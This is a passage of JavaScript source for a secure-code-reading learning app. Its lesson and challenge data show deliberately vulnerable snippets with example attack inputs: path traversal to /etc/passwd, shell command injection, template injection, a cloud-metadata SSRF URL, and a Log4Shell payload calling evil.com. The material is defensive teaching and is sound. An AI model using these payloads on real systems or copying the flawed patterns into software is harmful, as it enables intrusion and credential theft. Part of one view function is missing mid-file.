     {t:'read',lang:'python',label:'Vulnerable',code:'name = request.args.get("file")\npath = "/var/www/uploads/" + name\nreturn open(path).read()          # ?file=../../../../etc/passwd',note:'Concatenating a user filename lets <code class="inl">../</code> escape the folder. Defenses: reject <code class="inl">..</code>, resolve the real path and confirm it stays inside the base directory.'},
     {t:'quiz',q:'Which payload characterizes a path-traversal attempt against <code class="inl">/uploads/ + filename</code>?',
      opts:['A very long filename','<code class="inl">../../</code> sequences that climb out of the uploads directory','An uppercase filename','A filename with spaces'],a:1,
      why:'<b>../</b> walks up the directory tree. If the joined path is used without confining it to the base directory, it is path traversal.'}
   ]},
   {id:'w4', name:'Authentication & token flaws', xp:35, cards:[
     {t:'md',html:'<p>Auth bugs you can spot by reading:</p><p>• <b>Predictable tokens</b> — session ids or password resets from <code class="inl">Math.random()</code>, timestamps, or sequential ids.<br>• <b>JWT</b> accepting <code class="inl">alg: none</code>, or a hardcoded/weak secret.<br>• <b>Missing verification</b> — decoding a token but never checking its signature.</p>'},
     {t:'read',lang:'js',label:'Vulnerable — decode is not verify',code:'const token = req.headers.authorization;\nconst data = jwt.decode(token);   // decode != verify — no signature check!\nreq.user = data.user;             // attacker forges {user:"admin"}',note:'<code class="inl">jwt.decode</code> only parses the token; it does not check the signature. Use <code class="inl">jwt.verify(token, secret)</code> so a forged token is rejected.'},
     {t:'quiz',q:'What is wrong with using <code class="inl">jwt.decode(token)</code> for auth instead of <code class="inl">jwt.verify</code>?',
      opts:['Nothing','<code class="inl">decode</code> does not check the signature, so a forged token is trusted','decode is slower','decode needs a database'],a:1,
      why:'<b>decode</b> just parses the token; only <b>verify</b> checks the signature against your secret. Trusting decoded claims lets anyone forge an admin token.'}
   ]}
  ]
 },
 {
  id:'audit', name:'Auditor\'s Eye', tag:'META', icon:'👁', accent:'amber',
  sub:'The cross-language instincts that turn reading into finding.',
  lessons:[
   {id:'a1', name:'The source-to-sink method', xp:30, cards:[
     {t:'md',html:'<p>Every audit is the same loop, in any language:</p><p><b>1. Find sources</b> — where untrusted input enters (params, headers, files, network).<br><b>2. Find sinks</b> — dangerous operations (SQL, shell, HTML, file paths, deserialization).<br><b>3. Trace the path</b> between them.<br><b>4. Check for sanitization</b> on that path. None or weak? Likely a bug.</p><p>You grep for sinks first, then walk <i>backwards</i> to see if input reaches them.</p>'},
     {t:'quiz',q:'Best strategy for auditing a large unfamiliar codebase for injection bugs?',
      opts:['Read every file start to finish','Grep for dangerous sinks, then trace backwards to see if untrusted input reaches them','Only read the comments','Run it and see if it crashes'],a:1,
      why:'Sinks are a short, known list. <b>Grep the sinks, trace backwards to a source</b> — far faster than reading everything, and it centers the actual danger.'}
   ]},
   {id:'a2', name:'Spotting outdated & vulnerable libraries', xp:30, cards:[
     {t:'md',html:'<p>Much real-world risk is not custom code — it is <b>dependencies</b>. Learn to read the manifests:</p><p>• PHP: <code class="inl">composer.json</code> / <code class="inl">composer.lock</code><br>• .NET: <code class="inl">packages.config</code> / <code class="inl">.csproj</code><br>• JS: <code class="inl">package.json</code> / <code class="inl">package-lock.json</code><br>• Python: <code class="inl">requirements.txt</code></p><p>A <b>pinned old version</b> is your lead. Cross-reference it against known CVEs (e.g. the CVE database or GitHub Advisories). Tools like <code class="inl">npm audit</code> and OWASP Dependency-Check automate this.</p>'},
     {t:'read',lang:'js',label:'package.json — a lead',code:'"dependencies": {\n  "lodash": "4.17.4",        // known prototype-pollution CVEs < 4.17.12\n  "express": "4.16.0"\n}',note:'A specific old version is a gift: look it up in an advisory database. Version <code class="inl">4.17.4</code> of lodash predates fixes for several CVEs.'},
     {t:'quiz',q:'You find <code class="inl">"lodash":"4.17.4"</code> pinned in package.json. Best next step?',
      opts:['Assume it is fine','Check that exact version against a CVE / advisory database for known vulnerabilities','Delete package.json','Upgrade blindly without testing'],a:1,
      why:'A pinned version maps directly to published <b>CVEs/advisories</b>. Confirm whether that version is affected and whether the vulnerable code path is actually reachable.'}
   ]},
   {id:'a3', name:'Weak crypto & hardcoded secrets', xp:30, cards:[
     {t:'md',html:'<p>Two findings you can spot by <b>reading</b>, no exploit needed:</p><p><b>Weak crypto</b> — <code class="inl">MD5</code>/<code class="inl">SHA1</code> for passwords, <code class="inl">DES</code>, <code class="inl">ECB</code> mode, <code class="inl">Math.random()</code> for tokens.<br><b>Hardcoded secrets</b> — API keys, passwords, or private keys written straight into source.</p>'},
     {t:'read',lang:'python',label:'Two findings in three lines',code:'API_KEY = "sk_live_51H8xQ2eZ..."      # hardcoded secret\nhashed = hashlib.md5(password).hexdigest()  # MD5 for passwords',note:'Secrets in source leak through repos and backups. MD5 is fast and broken for password hashing — bcrypt/argon2 are the expected choices.'},
     {t:'quiz',q:'Which is a legitimate reading-only finding, no runtime test required?',
      opts:['A hardcoded API key in source combined with MD5 password hashing','A well-named variable','A function with comments','Use of prepared statements'],a:0,
      why:'Both <b>hardcoded secrets</b> and <b>MD5 for passwords</b> are visible statically. They are reliable, high-signal findings you report straight from the code.'}
   ]}
  ]
 },
 {
  id:'breach', name:'Breach Files', tag:'REAL-WORLD', icon:'🔥', accent:'amber',
  sub:'Real vulnerabilities that hacked real companies — and the code behind them.',
  lessons:[
   {id:'b1', name:'Log4Shell — logging turned into RCE', xp:40, cards:[
     {t:'md',html:'<p><b>Log4Shell</b> (CVE-2021-44228, December 2021) may be the most widespread vulnerability ever. <b>Log4j</b>, a logging library embedded in countless Java apps, evaluated special <code class="inl">${...}</code> lookups <i>inside log messages</i>. One of them, <code class="inl">${jndi:...}</code>, would reach out over the network and load a remote Java class — remote code execution.</p><p>The frightening part: you did not need to attack a login form. If any attacker-controlled string was ever <b>logged</b> — a username, a <code class="inl">User-Agent</code> header, a chat message — the exploit fired.</p>'},
     {t:'read',lang:'java',label:'Java — the innocent-looking trigger',code:'import org.apache.logging.log4j.Logger;\n\nString ua = request.getHeader("User-Agent");\nlogger.info("request from " + ua);   // just logging attacker input...\n// User-Agent: ${jndi:ldap://evil.com/x}  ->  Log4j fetches & runs remote code',note:'Nothing here looks dangerous — it is one log line. The flaw lived <b>inside Log4j</b>, which parsed <code class="inl">${jndi:...}</code> in the message. Lesson: a vulnerable <b>dependency</b> can turn ordinary code into RCE. The fix was upgrading Log4j.'},
     {t:'quiz',q:'Why was Log4Shell so dangerous and so hard to spot in your own code?',
      opts:['It required admin access','Merely logging attacker-controlled text triggered RCE — the bug was in the logging library, not your code','It only affected old Windows','It needed a database'],a:1,
      why:'The vulnerability was in the <b>Log4j dependency</b>\'s handling of <code class="inl">${jndi:}</code> lookups. Any logged attacker input became an exploit — which is why auditing dependencies matters as much as auditing your own code.'}
   ]},
   {id:'b2', name:'Heartbleed — a missing length check', xp:45, cards:[
     {t:'md',html:'<p><b>Heartbleed</b> (CVE-2014-0160, 2014) was a flaw in <b>OpenSSL</b>, the library securing much of the web. The TLS "heartbeat" lets a client send a small payload and asks the server to echo it back, along with a <b>length</b> the client specifies.</p><p>OpenSSL trusted that length without checking it against the actual payload size. Ask it to echo 64KB when you sent 1 byte, and the server returns 64KB of adjacent <b>memory</b> — which could hold passwords, session cookies, or the server\'s private key.</p>'},
     {t:'read',lang:'cpp',label:'C — the bug, simplified',code:'/* attacker controls payload_len, independent of the real data sent */\nunsigned char *buffer = malloc(payload_len);\nmemcpy(buffer, payload, payload_len);   // no check: payload_len may exceed real payload\n/* buffer now holds bytes from past the input -> memory disclosure */',note:'This is an <b>over-read</b>: a missing <i>bounds check</i> on an attacker-supplied length. The fix added one check that <code class="inl">payload_len</code> did not exceed the data actually received. One <code class="inl">if</code> statement.'},
     {t:'quiz',q:'What class of bug was Heartbleed?',
      opts:['SQL injection','A missing bounds check on an attacker-controlled length, causing a memory over-read (disclosure)','A weak password','Cross-site scripting'],a:1,
      why:'Heartbleed trusted a client-supplied <b>length</b> and copied that many bytes regardless of the real payload size — leaking adjacent memory. It is the C/C++ reading skill applied to world-shaking code.'}
   ]},
   {id:'b3', name:'Capital One — SSRF to cloud metadata', xp:45, cards:[
     {t:'md',html:'<p>In 2019, an attacker stole the data of roughly <b>100 million</b> Capital One customers. The entry point was a <b>Server-Side Request Forgery</b> against a misconfigured firewall/proxy.</p><p>The attacker made the server request the AWS <b>metadata endpoint</b> <code class="inl">http://169.254.169.254/</code>, which returns the temporary <b>IAM credentials</b> of the server\'s cloud role. With those keys, they read the company\'s storage buckets.</p>'},
     {t:'read',lang:'python',label:'The pattern that made it possible',code:'# The server could be tricked into fetching an attacker-chosen URL:\n#   http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# which returns temporary AWS keys for the instance role.\nresp = requests.get(user_supplied_url)   # SSRF -> cloud credential theft',note:'This ties two lessons together: an <b>SSRF</b> reaching the cloud <b>metadata</b> service. Modern defenses: enforce IMDSv2, block <code class="inl">169.254.169.254</code>, and allowlist outbound destinations.'},
     {t:'quiz',q:'How did an SSRF turn into a 100-million-record breach at Capital One?',
      opts:['It crashed the server','SSRF reached the cloud metadata endpoint, which returned IAM credentials used to read stored data','It guessed the admin password','It exploited a buffer overflow'],a:1,
      why:'The SSRF fetched <code class="inl">169.254.169.254</code> metadata to steal the instance\'s <b>IAM role credentials</b>, then used them against storage. SSRF + cloud metadata is a critical combination to recognize.'}
   ]}
  ]
 }
];

/* =========================================================
   HUNT — find-the-vulnerable-line challenges
   each: id, title, lang, xp, difficulty, lines[], vuln[](0-indexed),
         brief, debrief (why those lines)
   ========================================================= */
const HUNTS = [
 {id:'h1', title:'User lookup endpoint', lang:'php', xp:40, diff:'Easy',
  brief:'A PHP endpoint that looks up a user. Tap every line you think is dangerous, then submit.',
  lines:[
   '$id = $_GET["id"];',
   '$conn = new mysqli("localhost","app","pw","shop");',
   '$sql = "SELECT name,email FROM users WHERE id=" . $id;',
   '$res = $conn->query($sql);',
   '$row = $res->fetch_assoc();',
   'echo "<h1>" . $row["name"] . "</h1>";'
  ],
  vuln:[2,5],
  debrief:'<p><b>Line 3</b> concatenates <code class="inl">$id</code> straight into SQL — classic <b>SQL injection</b>. Fix with a prepared statement.</p><p><b>Line 6</b> echoes <code class="inl">$row["name"]</code> into HTML with no encoding — <b>stored XSS</b> if the name field is attacker-controlled. Wrap it in <code class="inl">htmlspecialchars()</code>.</p><p>Line 1 is only a <i>source</i> — untrusted, but not itself the bug.</p>'},

 {id:'h2', title:'Ping diagnostic tool', lang:'php', xp:40, diff:'Easy',
  brief:'An admin "ping" utility. Which line lets an attacker run OS commands?',
  lines:[
   '$target = $_POST["target"];',
   'if (empty($target)) { die("no target"); }',
   '$output = shell_exec("ping -c 4 " . $target);',
   'echo "<pre>" . htmlspecialchars($output) . "</pre>";'
  ],
  vuln:[2],
  debrief:'<p><b>Line 3</b> passes user input to <code class="inl">shell_exec</code>. Input <code class="inl">8.8.8.8; cat /etc/passwd</code> runs both commands — <b>command injection → RCE</b>.</p><p>Note line 4 <i>does</i> encode output correctly, so it is not the bug. The <code class="inl">empty()</code> check on line 2 validates presence, not content — it stops nothing dangerous.</p>'},

 {id:'h3', title:'Legacy string handler (C)', lang:'cpp', xp:50, diff:'Medium',
  brief:'A C function copying a request field into a fixed buffer. Find the memory-safety bugs.',
  lines:[
   'void handle(char *input) {',
   '    char buffer[128];',
   '    int len = strlen(input);',
   '    strcpy(buffer, input);',
   '    char *log = (char*)malloc(len);',
   '    sprintf(log, "got: %s", input);',
   '    free(log);',
   '}'
  ],
  vuln:[3,5],
  debrief:'<p><b>Line 4</b> — <code class="inl">strcpy</code> into a 128-byte buffer with no length check: input over 128 bytes causes a <b>stack buffer overflow</b>.</p><p><b>Line 6</b> — <code class="inl">sprintf</code> also has no bound, and <code class="inl">log</code> was sized only <code class="inl">len</code> bytes (line 5) while the format adds <code class="inl">"got: "</code> — a <b>heap overflow</b>. Use <code class="inl">snprintf</code> with the real allocation size.</p>'},

 {id:'h4', title:'C# report generator', lang:'csharp', xp:50, diff:'Medium',
  brief:'An ASP.NET action building a report. Spot the injection.',
  lines:[
   'public IActionResult Report(string dept) {',
   '    var conn = new SqlConnection(_cs);',
   '    var q = $"SELECT * FROM Sales WHERE Dept=\'{dept}\'";',
   '    var cmd = new SqlCommand(q, conn);',
   '    conn.Open();',
   '    var r = cmd.ExecuteReader();',
   '    return View(r);',
   '}'
  ],
  vuln:[2],
  debrief:'<p><b>Line 3</b> uses string <b>interpolation</b> to build SQL from <code class="inl">dept</code>. That is SQL injection just like concatenation — the C# type system does not save you here.</p><p>Fix: <code class="inl">SqlCommand("...Dept=@d",conn)</code> then <code class="inl">cmd.Parameters.AddWithValue("@d",dept)</code>.</p>'},

 {id:'h5', title:'Node file server', lang:'js', xp:55, diff:'Medium',
  brief:'An Express route serving files. Two separate bug classes hide here.',
  lines:[
   'app.get("/file", (req, res) => {',
   '  const name = req.query.name;',
   '  const path = "./uploads/" + name;',
   '  const data = fs.readFileSync(path);',
   '  const { exec } = require("child_process");',
   '  exec("file " + path, (e,o) => res.send(o + data));',
   '});'
  ],
  vuln:[2,5],
  debrief:'<p><b>Line 3</b> builds a path from raw input — <code class="inl">?name=../../etc/passwd</code> is a <b>path traversal</b>. Normalize and confine to the uploads dir.</p><p><b>Line 6</b> passes that path to <code class="inl">exec</code> (a shell) — <b>command injection</b>. Use <code class="inl">execFile</code> with an argument array and validate the filename.</p>'},

 {id:'h6', title:'Auth token check', lang:'python', xp:55, diff:'Hard',
  brief:'A Python login flow. The bug is subtle — think about logic and crypto, not just sinks.',
  lines:[
   'def login(user, pw, token):',
   '    row = db.execute("SELECT hash,secret FROM u WHERE name=?", [user]).one()',
   '    if hashlib.md5(pw.encode()).hexdigest() == row.hash:',
   '        expected = hmac.new(row.secret, user.encode()).hexdigest()',
   '        if token == expected:',
   '            return make_session(user)',
   '    return None'
  ],
  vuln:[2,4],
  debrief:'<p><b>Line 3</b> — passwords hashed with <b>MD5</b>: fast, broken, trivially cracked from a dump. Use bcrypt/argon2.</p><p><b>Line 5</b> — <code class="inl">token == expected</code> is a non-constant-time compare, exposing a <b>timing side-channel</b>. Use <code class="inl">hmac.compare_digest()</code>.</p><p>Good news: line 2 <i>is</i> parameterized (<code class="inl">?</code> + list), so it is safe — a reminder to reward correct code, not flag every query.</p>'},

 {id:'h7', title:'Template render (PHP)', lang:'php', xp:45, diff:'Medium',
  brief:'A small templating helper. Where does untrusted input reach a dangerous sink?',
  lines:[
   '$tpl = $_GET["tpl"] ?? "home";',
   '$vars = json_decode($_COOKIE["v"] ?? "{}", true);',
   'extract($vars);',
   'include("templates/" . $tpl . ".php");',
   'eval("?>" . file_get_contents("cache.php"));'
  ],
  vuln:[2,3,4],
  debrief:'<p><b>Line 3</b> — <code class="inl">extract()</code> on attacker JSON lets an attacker set arbitrary local variables (<b>variable injection</b>).</p><p><b>Line 4</b> — <code class="inl">include</code> with user-controlled <code class="inl">$tpl</code> is <b>Local/Remote File Inclusion</b> (<code class="inl">?tpl=../../etc/passwd%00</code> style).</p><p><b>Line 5</b> — <code class="inl">eval()</code> executing file contents is a code-execution sink; dangerous the moment that file or its inputs are influenced.</p>'},

 {id:'h8', title:'Deserialize & dispatch (C#)', lang:'csharp', xp:60, diff:'Hard',
  brief:'A message handler. One line is a well-known RCE primitive.',
  lines:[
   'byte[] body = ReadRequestBody(ctx);',
   'var fmt = new BinaryFormatter();',
   'var msg = (Message)fmt.Deserialize(new MemoryStream(body));',
   'var handler = _map[msg.Type];',
   'handler.Invoke(msg.Payload);'
  ],
  vuln:[1,2],
  debrief:'<p><b>Lines 2–3</b> — <code class="inl">BinaryFormatter.Deserialize</code> on attacker-supplied bytes is a textbook <b>insecure deserialization → RCE</b>. Microsoft deprecated it for exactly this. Use a safe, type-constrained serializer (System.Text.Json) and never deserialize untrusted data into arbitrary types.</p>'},
 {id:'h9', title:'Template preview endpoint', lang:'python', xp:50, diff:'Medium',
  brief:'A Flask endpoint that renders a user-supplied template fragment. Find the injection.',
  lines:[
   '@app.route("/preview")',
   'def preview():',
   '    tpl = request.args.get("tpl", "")',
   '    return render_template_string("<div>" + tpl + "</div>")'
  ],
  vuln:[3],
  debrief:'<p><b>Line 4</b> passes a template built from user input to <code class="inl">render_template_string</code> — <b>Server-Side Template Injection</b>. <code class="inl">?tpl={{7*7}}</code> returns 49; real payloads read files and run commands. Render a <b>fixed</b> template and pass values as bound variables instead.</p><p>Line 3 is only the source — untrusted, but not itself the sink.</p>'},
 {id:'h10', title:'URL preview service', lang:'python', xp:50, diff:'Medium',
  brief:'A service that fetches a URL on the user\'s behalf. Where is the SSRF?',
  lines:[
   '@app.route("/fetch")',
   'def fetch():',
   '    target = request.args.get("url")',
   '    if not target:',
   '        abort(400)',
   '    return requests.get(target).text'
  ],
  vuln:[5],
  debrief:'<p><b>Line 6</b> fetches a user-supplied URL server-side — <b>SSRF</b>. <code class="inl">?url=http://169.254.169.254/latest/meta-data/</code> reaches the cloud metadata service and can leak IAM credentials. Allowlist destinations and block internal IP ranges. The empty-check on lines 4–5 validates presence, not safety.</p>'},
 {id:'h11', title:'Login audit logger (Java)', lang:'java', xp:60, diff:'Hard',
  brief:'A Java handler that logs each login attempt. Assume it uses a vulnerable Log4j version — which line is the exploit vector?',
  lines:[
   'public void handle(HttpRequest req) {',
   '    String ua = req.getHeader("User-Agent");',
   '    String user = req.getParameter("user");',
   '    logger.info("login user=" + user + " ua=" + ua);',
   '    auth.check(user);',
   '}'
  ],
  vuln:[3],
  debrief:'<p><b>Line 4</b> logs attacker-controlled input (<code class="inl">user</code> and the <code class="inl">User-Agent</code>). On a vulnerable <b>Log4j</b> version (Log4Shell, CVE-2021-44228) that single log call is remote code execution via a <code class="inl">${jndi:...}</code> payload — no login required. The bug lives in the <b>dependency</b>, so the fix is upgrading Log4j, not rewriting the log line. This is why logging untrusted input is a sink worth flagging.</p>'}
];

/* =========================================================
   DAILY TARGET — one rotating hunt per day
   ========================================================= */
function dailyHunt(){
  const d=today();
  // deterministic pick from date
  let h=0; for(const c of d) h=(h*31+c.charCodeAt(0))>>>0;
  return HUNTS[h % HUNTS.length];
}

/* =========================================================
   VIEWS
   ========================================================= */
function trackProgress(t){
  const done=t.lessons.filter(l=>S.done[l.id]).length;
  return {done,total:t.lessons.length,pct:Math.round(done/t.lessons.length*100)};
}
function nextLessonIndex(t){
  for(let i=0;i<t.lessons.length;i++) if(!S.done[t.lessons[i].id]) return i;
  return -1; // all done
}

function vHome(){
  const dh=dailyHunt();
  const dDone = S.hunts[dh.id] && S.hunts[dh.id].solved && S.daily===today();
  let h='<h1 class="pg">Learn to read code like an attacker.</h1>'+
    '<p class="sub">Short lessons and vulnerability hunts that teach you to understand code and spot the bugs in it — no programming background needed.</p>';

  // daily card
  h+='<div class="card daily tap" data-act="daily">'+
     '<div class="dailytag">◈ Daily Target</div>'+
     '<div style="display:flex;align-items:center;gap:12px">'+
       '<div style="flex:1"><div class="trname">'+dh.title+'</div>'+
       '<div class="trsub" style="margin:2px 0 0">'+(dDone?'Cleared today — nice.':'Find the bugs in this '+langName(dh.lang)+' snippet.')+'</div></div>'+
       '<span class="chip '+(dDone?'good':'amber')+'">'+(dDone?'✓ DONE':'+'+dh.xp+' XP')+'</span>'+
     '</div></div>';

  h+='<div class="sect">Learning tracks</div>';
  for(const t of TRACKS){
    const p=trackProgress(t);
    h+='<button class="card tap trackcard" data-act="track" data-id="'+t.id+'">'+
        '<div class="tricon">'+t.icon+'</div>'+
        '<div class="trmeta">'+
          '<div class="trname">'+t.name+' <span class="chip '+(t.accent)+'" style="vertical-align:2px">'+t.tag+'</span></div>'+
          '<div class="trsub">'+t.sub+'</div>'+
          '<div class="pbar'+(t.accent==='violet'?' v':'')+'"><i style="width:'+p.pct+'%"></i></div>'+
        '</div>'+
        '<div class="count">'+p.done+'/'+p.total+'</div>'+
       '</button>';
  }
  return h;
}

function langName(l){return {php:'PHP',csharp:'C#',cpp:'C/C++',js:'JavaScript',python:'Python',sql:'SQL'}[l]||l;}

function vTrack(tid){
  const t=TRACKS.find(x=>x.id===tid);
  const nextI=nextLessonIndex(t);
  let h='<button class="back" data-act="home">‹ Tracks</button>'+
        '<h1 class="pg">'+t.name+'</h1><p class="sub">'+t.sub+'</p>';
  t.lessons.forEach((l,i)=>{
    const done=!!S.done[l.id];
    const locked = i>0 && !S.done[t.lessons[i-1].id] && !done;
    const isNext = i===nextI;
    const stateCls = done?'done':(isNext?'next':'');
    const mark = done?'✓':(locked?'🔒':(i+1));
    h+='<button class="card tap lrow'+(locked?' locked':'')+'" '+(locked?'disabled':'data-act="lesson" data-track="'+t.id+'" data-i="'+i+'"')+'>'+
        '<div class="lstate '+stateCls+'">'+mark+'</div>'+
        '<div style="flex:1"><div class="lname">'+l.name+'</div>'+
        '<div class="lxp">'+(done?'Completed':(l.cards.length+' steps'))+'</div></div>'+
        '<span class="chip'+(done?' good':'')+'">'+(done?'+'+l.xp:'+'+l.xp)+' XP</span>'+
       '</button>';
  });
  return h;
}

/* ---- lesson runner (card stepper) ---- */
let LS=null; // {track,i,card,answered}
function vLesson(){
  const t=TRACKS.find(x=>x.id===view.trackId);
  const l=t.lessons[view.i];
  if(!LS || LS.lid!==l.id){ LS={lid:l.id, card:0, answered:false, correct:0, quizzes:0}; }
  const card=l.cards[LS.card];
  const total=l.cards.length;
  let h='<button class="back" data-act="track" data-id="'+t.id+'">‹ '+t.name+'</button>';
  h+='<div class="qmeta"><div class="pbar"><i style="width:'+Math.round((LS.card)/total*100)+'%"></i></div>'+
     '<span class="count">'+(LS.card+1)+'/'+total+'</span></div>';
  h+='<h1 class="pg" style="font-size:20px;margin-top:6px">'+l.name+'</h1>';

  const refs = (LS.card===total-1) ? refsHTML(l.id) : '';
  if(card.t==='md'){
    h+='<div class="card">'+card.html+'</div>';
    h+=refs;
    h+='<button class="btn" data-act="next">Continue</button>';
  }
  else if(card.t==='read'){
    h+=codebox(card.code,card.lang,card.label||langName(card.lang));
    if(card.note) h+='<div class="explain" style="border-color:var(--violet)">'+card.note+'</div>';
    h+=refs;
    h+='<button class="btn" data-act="next">Got it</button>';
  }
  else if(card.t==='quiz'){
    h+='<div class="card" style="border-color:var(--amber-dim)"><b>Q.</b> '+card.q+'</div>';
    const keys=['A','B','C','D','E'];
    card.opts.forEach((o,oi)=>{
      let cls='opt';
      if(LS.answered){
        if(oi===card.a) cls+=' right';
        else if(oi===LS.pick) cls+=' wrong';
        else cls+=' dim';
      }
      h+='<button class="'+cls+'" '+(LS.answered?'disabled':'data-act="answer" data-oi="'+oi+'"')+'>'+
         '<span class="key">'+keys[oi]+'</span>'+o+'</button>';
    });
    if(LS.answered){
      const ok=LS.pick===card.a;
      h+='<div class="explain"><b>'+(ok?'Correct.':'Not quite.')+'</b> '+card.why+'</div>';
      h+=refs;
      h+='<button class="btn" data-act="next">Continue</button>';
    }
  }
  return h;
}

/* ---- hunt play ---- */
let HS=null; // {id, picks:Set, checked}
function vHuntPlay(){
  const hu=HUNTS.find(x=>x.id===view.huntId);
  if(!HS || HS.id!==hu.id){ HS={id:hu.id, picks:new Set(), checked:false}; }
  let h='<button class="back" data-act="hunt-back">‹ Hunts</button>'+
        '<h1 class="pg" style="font-size:20px">'+hu.title+'</h1>'+
        '<p class="sub" style="margin-bottom:10px">'+hu.brief+'</p>'+
        '<div style="display:flex;gap:8px;margin-bottom:6px"><span class="chip amber">'+hu.diff+'</span><span class="chip">'+langName(hu.lang)+'</span><span class="chip violet">+'+hu.xp+' XP</span></div>';
  // code with tappable lines
  h+='<div class="codebox"><span class="lang">'+langName(hu.lang)+' — tap dangerous lines</span><pre style="padding:6px 0">';
  hu.lines.forEach((ln,i)=>{
    let cls='hline';
    if(HS.checked){
      const isVuln=hu.vuln.includes(i), picked=HS.picks.has(i);
      if(isVuln) cls+=' hit';
      else if(picked) cls+=' miss';
    } else if(HS.picks.has(i)) cls+=' hit';
    h+='<button class="'+cls+'" '+(HS.checked?'disabled':'data-act="hline" data-i="'+i+'"')+'>'+
       '<span class="no">'+(i+1)+'</span><span class="src">'+hl(ln,hu.lang)+'</span></button>';
  });
  h+='</pre></div>';

  if(!HS.checked){
    const n=HS.picks.size;
    h+='<button class="btn" '+(n===0?'disabled':'')+' data-act="hunt-check">Submit '+(n?'('+n+' line'+(n>1?'s':'')+')':'')+'</button>';
    h+='<p class="lxp center" style="margin-top:10px">Green = you flagged it. Submit to reveal the real answers.</p>';
  } else {
    const hits=hu.vuln.filter(v=>HS.picks.has(v)).length;
    const misses=[...HS.picks].filter(p=>!hu.vuln.includes(p)).length;
    const missed=hu.vuln.filter(v=>!HS.picks.has(v)).length;
    const perfect = missed===0 && misses===0;
    h+='<div class="explain" style="border-color:'+(perfect?'var(--good)':'var(--amber)')+'">'+
       '<b>'+(perfect?'Flawless audit.':'Here is the breakdown.')+'</b> '+
       'You correctly flagged '+hits+' of '+hu.vuln.length+' vulnerable line'+(hu.vuln.length>1?'s':'')+
       (misses?', with '+misses+' false positive'+(misses>1?'s':'')+'':'')+'.<br><br>'+hu.debrief+'</div>';
    h+='<button class="btn ghost" data-act="hunt-back">Back to hunts</button>';
  }
  return h;
}

     '</div>';
  h+='<div class="statrow" style="margin-top:10px">'+
     '<div class="stat"><div class="v">'+lessonsDone+'/'+lessonsTotal+'</div><div class="k">Lessons</div></div>'+
     '<div class="stat"><div class="v">'+huntsDone+'/'+HUNTS.length+'</div><div class="k">Hunts cleared</div></div>'+
     '</div>';
  h+='<div class="sect">Badges</div><div class="badgegrid">';
  for(const b of BADGES){
    const on=!!S.badges[b.id];
    h+='<div class="badge'+(on?'':' off')+'"><div class="bi">'+b.ic+'</div><div class="bn">'+b.n+'</div><div class="bd">'+b.d+'</div></div>';
  }
  h+='</div>';
  h+='<div class="sect">Rank ladder</div><div class="card">';
  RANKS.forEach((rk,i)=>{
    const reached=S.xp>=rk[0];
    h+='<div style="display:flex;align-items:center;gap:10px;padding:5px 0;'+(i<RANKS.length-1?'border-bottom:1px solid var(--line)':'')+'">'+
       '<span style="width:16px">'+(reached?'✓':'·')+'</span>'+
       '<span style="flex:1;font-family:var(--disp);font-weight:600;color:'+(reached?'var(--ink)':'var(--mut)')+'">'+rk[1]+'</span>'+
       '<span class="lxp">'+rk[0]+' XP</span></div>';
  });
  h+='</div>';
  h+='<div class="sect">App & updates</div>';
  h+='<div class="card"><div style="display:flex;align-items:center;justify-content:space-between;gap:12px">'+
     '<div><div class="lname">codeLearn</div><div class="lxp">Version '+APP_VERSION+'</div></div>'+
     '<button class="btn ghost" style="width:auto;margin:0;padding:11px 16px;font-size:13px" data-act="checkupdate">Check for updates</button>'+
     '</div><div class="lxp" id="upstatus" style="margin-top:10px"></div></div>';
  h+='<div class="sect">Backup & restore</div>';
  h+='<div class="card"><div class="lxp" style="margin-bottom:12px">Save a backup of your XP, badges, streak, and lesson progress — then restore it on another device, or if this device loses its saved data.</div>'+
     '<button class="btn ghost" style="margin-top:0" data-act="export">Export / save backup</button>'+
     '<button class="btn ghost" data-act="import">Import / restore backup</button></div>';
  h+='<button class="btn danger" data-act="reset">Reset all progress</button>';
  return h;
}

/* =========================================================
   ACTION HANDLER — every data-act runs through here
   ========================================================= */
function handleAct(el){
  const a=el.dataset.act;
  switch(a){
    case 'home': go({name:'learn'}); break;
    case 'track': go({name:'track', trackId:el.dataset.id}); break;

    case 'lesson':
      LS=null;
      go({name:'lesson', trackId:el.dataset.track, i:+el.dataset.i});
      break;

    case 'answer': {
      const oi=+el.dataset.oi;
      const t=TRACKS.find(x=>x.id===view.trackId), l=t.lessons[view.i], card=l.cards[LS.card];
      LS.pick=oi; LS.answered=true; LS.quizzes++;
      if(oi===card.a){ LS.correct++; }
      render();
      break;
    }

    case 'next': {
      const t=TRACKS.find(x=>x.id===view.trackId), l=t.lessons[view.i];
      if(LS.card < l.cards.length-1){
        LS.card++; LS.answered=false; LS.pick=undefined;
        render();
      } else {
        // finish lesson
        const first=!S.done[l.id];
        S.done[l.id]=true; save();
        if(first){ addXP(l.xp); }
        finishLesson(t,l,first);
      }
      break;
    }

    case 'daily': {
      const dh=dailyHunt();
      HS=null;
      go({name:'huntplay', huntId:dh.id, fromDaily:true});
      break;
    }
    case 'hunt': HS=null; go({name:'huntplay', huntId:el.dataset.id}); break;
    case 'hunt-back': go({name:'hunt'}); break;

    case 'hline': {
      const i=+el.dataset.i;
      if(HS.picks.has(i)) HS.picks.delete(i); else HS.picks.add(i);
      render();
      break;
    }

    case 'hunt-check': {
      const hu=HUNTS.find(x=>x.id===HS.id);
      HS.checked=true;
      const missed=hu.vuln.filter(v=>!HS.picks.has(v)).length;
      const fp=[...HS.picks].filter(p=>!hu.vuln.includes(p)).length;
      const perfect = missed===0 && fp===0;
      const solved = missed===0;               // found all vulns = solved
      const prev=S.hunts[hu.id]||{attempts:0};
      const firstSolve = solved && !prev.solved;
      S.hunts[hu.id]={
        solved: solved||prev.solved,
        perfect: perfect||prev.perfect,
        attempts:(prev.attempts||0)+1
      };
      save();
      if(firstSolve){
        let gain=hu.xp;
        if(perfect) gain+=15;
        addXP(gain);
        if(view.fromDaily){ S.daily=today(); save(); grant('daily'); }
        setTimeout(()=>toast((perfect?'✦ Perfect! +':'✓ Solved! +')+ (perfect?hu.xp+15:hu.xp)+' XP'),300);
      } else if(solved && view.fromDaily && S.daily!==today()){
        S.daily=today(); save(); grant('daily');
      }
      render();
      break;
    }

    case 'checkupdate': checkForUpdates(); break;
    case 'export': openBackup('export'); break;
    case 'import': openBackup('import'); break;

    case 'reset':
      if(confirm('Reset all XP, badges, streak and progress? This cannot be undone.')){
        S={xp:0,done:{},hunts:{},streak:{last:'',n:0},badges:{},daily:''};
        save(); renderHeader(); go({name:'learn'});
        toast('Progress reset');
      }
      break;
  }
}

/* lesson completion screen */
function finishLesson(t,l,first){
